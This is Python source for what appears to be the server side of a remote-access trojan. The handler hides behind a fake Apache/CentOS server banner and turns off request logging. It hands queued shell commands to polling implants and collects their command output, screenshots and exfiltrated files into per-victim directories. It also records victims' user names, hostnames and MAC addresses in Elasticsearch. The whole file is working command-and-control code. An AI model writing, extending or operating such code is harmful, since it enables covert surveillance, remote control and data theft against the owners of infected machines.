import os
import json
import time
import queue
import base64
import threading
import urllib.parse
from pathlib import Path
from urllib.parse import unquote_plus
from http.server import BaseHTTPRequestHandler
from server_settings import (
    ES_HANDLER, CONNECTED_CLIENTS, client_lock,
    command_queue, response_storage, response_lock,
    CMD_REQUEST, RESPONSE, CWD_RESPONSE, CLIENT_CREDENTIALS,
    RESPONSE_KEY, KEEP_ALIVE_CMD)


# Map client IP -> last command ID sent
last_cmd_id_per_ip = {}
last_cmd_lock = threading.Lock()
CWD = None


class MyHandler(BaseHTTPRequestHandler):

    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    # creates a directory for each client using elasticsearch ID
    def create_client_dir(self, client_id):
        if not client_id:
            return
        dir_path = Path(__file__).parent / str(client_id)
        dir_path.mkdir(parents=True, exist_ok=True)


    def get_client_id_by_ip(self):
        with client_lock:
            for cid, info in CONNECTED_CLIENTS.items():
                if info.get('ip') == self.client_address[0]:
                    return cid
        return None


    # Handles get request from client
    def do_GET(self):
        try:
            if not self.path.startswith(CMD_REQUEST):
                self.send_response(404)
                self.end_headers()
                return

            client_identifier = self.path.split(CMD_REQUEST)[1]
            client_account, client_hostname = client_identifier.split('@')
            client_id = ES_HANDLER.get_client_id("system-name", client_hostname)

            if not client_id:
                client_id = client_identifier
            with client_lock:
                CONNECTED_CLIENTS[client_id] = {
                    'display': client_identifier,
                    'last_seen': time.time(),
                    'ip': self.client_address[0]
                }

            command_to_send = None
            cmd_id = None
            temp_queue = []
            try:
                while True:
                    item = command_queue.get_nowait()
                    if item[0] == client_id:
                        command_to_send = item[1]
                        cmd_id = item[2]
                        with last_cmd_lock:
                            last_cmd_id_per_ip[self.client_address[0]] = cmd_id
                        break
                    else:
                        temp_queue.append(item)
            except queue.Empty:
                pass
            for item in temp_queue:
                command_queue.put(item)

            if command_to_send is None:
                command_to_send = KEEP_ALIVE_CMD

            self.send_response(200)
            self.end_headers()
            self.wfile.write(command_to_send.encode())

        except Exception as e:
            print(f"[-] Error in do_GET: {e}")
            self.send_response(500)
            self.end_headers()


    # Handles post requests from client
    def do_POST(self):
        global CWD
        try:
            if self.path == RESPONSE or self.path == CWD_RESPONSE:
                data = self._handle_post_data()
                if not data.strip():
                    self.send_response(200)
                    self.end_headers()
                    return

                # Try to parse as key=value pairs (new client format)
                parsed = urllib.parse.parse_qs(data)
                current_directory = parsed.get('cwd', [None])[0]
                if current_directory:
                    CWD = current_directory

                # Handle image if present
                image_b64 = parsed.get('image', [None])[0]
                if image_b64:
                    # decode and save image
                    try:
                        image_b64 = parsed.get('image', [None])[0]
                        if image_b64:
                            image_data = base64.b64decode(image_b64)
                            client_id = self.get_client_id_by_ip()

                            if not os.path.exists(client_id):
                                self.create_client_dir(client_id)

                            filename = Path(client_id) / f"screenshot_{time.strftime('%Y-%m-%d_%H%M%S')}.png"
                            with open(filename, 'wb') as f:
                                f.write(image_data)
                            print(f"[+] Saved screenshot: {filename}")

                    except Exception as e:
                        print(f"[-] Failed to decode/save image: {e}")


                # Handle file if present
                file_b64 = parsed.get('file', [None])[0]
                if file_b64:
                    try:
                        file_data = base64.b64decode(file_b64)
                        client_id = self.get_client_id_by_ip() or "unknown"
                        file_name = parsed.get('filename', ['unnamed'])[0]

                        # Create client directory if it doesn't exist
                        dir_path = Path(client_id)
                        dir_path.mkdir(exist_ok=True)

                        filepath = dir_path / file_name
                        with open(filepath, 'wb') as f:
                            f.write(file_data)

                        print(f"[+] Saved file: {filepath}")
                    except Exception as e:
                        print(f"[-] Failed to save file: {e}")


                cmd_id = parsed.get('command_id', [None])[0]
                cmd_output = parsed.get('output', [''])[0]

                if cmd_id is not None:
                    if cmd_output.strip():
                        with response_lock:
                            response_storage[int(cmd_id)] = cmd_output
                else:
                    with last_cmd_lock:
                        last_id = last_cmd_id_per_ip.get(self.client_address[0])
                    if last_id is not None and data.strip():
                        with response_lock:
                            response_storage[last_id] = data
                    elif data.strip():
                        print(f"[+] Output from {self.client_address[0]}:")
                        print(data)

                self.send_response(200)
                self.end_headers()


            elif self.path == CLIENT_CREDENTIALS:
                content_length = int(self.headers.get('Content-Length', 0))
                raw_data = self.rfile.read(content_length).decode()
                parsed = urllib.parse.parse_qs(raw_data)
                json_str = parsed.get(RESPONSE_KEY, [None])[0]

                current_directory = parsed.get('cwd', [None])[0]
                if current_directory:
                    CWD = current_directory

                if not json_str:
                    self.send_response(400)
                    self.end_headers()
                    return

                try:
                    client_info = json.loads(json_str)
                except json.JSONDecodeError as e:
                    print(f"[-] Invalid JSON from client: {e}")
                    self.send_response(400)
                    self.end_headers()
                    return

                username = client_info.get("user")
                system_name = client_info.get("system-name")
                display = f"{username}@{system_name}"

                if username and ES_HANDLER.is_client_present(username):
                    client_id = ES_HANDLER.get_client_id("mac-address", client_info.get("mac-address"))
                    if client_id:
                        ES_HANDLER.update_document(client_id, client_info)
                        print(f"[+] Updated client info for {username}")

                        with client_lock:
                            for cid, info in list(CONNECTED_CLIENTS.items()):
                                if info.get('display') == display and cid != client_id:
                                    CONNECTED_CLIENTS[client_id] = CONNECTED_CLIENTS.pop(cid)
                                    break
                else:
                    new_id = ES_HANDLER.index_client_data(client_info)
                    if new_id:
                        print(f"[+] Indexed new client info for {username} with ID {new_id}")
                        with client_lock:
                            for cid, info in list(CONNECTED_CLIENTS.items()):
                                if info.get('display') == display:
                                    CONNECTED_CLIENTS[new_id] = CONNECTED_CLIENTS.pop(cid)
                                    break
                self.send_response(200)
                self.end_headers()

        except Exception as e:
            print(f"[-] Error in do_POST: {e}")
            self.send_response(500)
            self.end_headers()


    def _handle_post_data(self):
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            return ""
        data = self.rfile.read(content_length).decode()
        if data.startswith(f"{RESPONSE_KEY}="):
            data = data.replace(f"{RESPONSE_KEY}=", "", 1)
        return unquote_plus(data)


    def log_request(self, code="-", size="-"):
        pass
